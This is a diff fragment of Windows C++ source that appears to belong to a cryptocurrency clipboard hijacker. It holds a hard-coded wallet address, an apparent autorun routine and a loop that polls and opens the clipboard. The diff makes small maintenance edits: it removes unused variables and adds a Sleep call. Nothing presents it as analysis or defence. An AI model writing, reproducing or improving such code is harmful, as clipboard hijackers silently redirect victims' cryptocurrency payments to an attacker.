@@ -17,8 +17,7 @@ void autoranner();
 
 
 string crypto = "15DQ4VCLvidYRsPjVKwxgntFrta16Kgikv";
-string data1;
-string data2;
+
 
 void WINAPI main()
 {
@@ -36,8 +35,7 @@ void WINAPI main()
 	{
 		Reactor();
 	}
-	
-	
+
 }
 
 void checkers(string& data)
@@ -77,7 +75,6 @@ void autoranner()
 
 void Reactor()
 {
-
 	if (IsClipboardFormatAvailable(CF_TEXT))
 	{
 		if (OpenClipboard(NULL))
@@ -88,6 +85,7 @@ void Reactor()
 		}
 		Sleep(2000);
 	}
+	Sleep(2000);
 }
 
 string Readbuffer()
